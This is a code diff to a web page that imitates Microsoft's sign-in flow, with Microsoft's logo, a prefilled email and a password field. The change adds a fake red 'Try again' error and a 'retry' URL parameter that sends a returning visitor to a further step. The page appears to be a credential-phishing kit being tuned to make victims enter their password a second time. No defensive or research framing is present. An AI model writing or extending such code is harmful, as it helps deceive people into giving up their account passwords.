@@ -163,6 +163,7 @@
     container.innerHTML = `
       <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
       <div class="muted" style="margin:10px 9px;">← ${email}</div>
+      <div style="color: #e81123; font-size: 14px; font-weight: bold; margin: 10px 0;">Try again</div>
       <h1 class="header">Enter Password</h1>
       <input type="password" id="passwordInput" placeholder="Password" required 
        style="border: none; outline: none; background: transparent; 
@@ -230,7 +231,13 @@
       if (hinted && validateEmail(hinted)) {
         email = hinted;
         if (step === "password") {
-          showStep2();
+          // Check if this is a retry from first attempt
+          const retry = q.get("retry");
+          if (retry === "true") {
+            showStep3(); // Go directly to step 3 for retry
+          } else {
+            showStep2(); // Normal password step
+          }
           return;
         }
       }
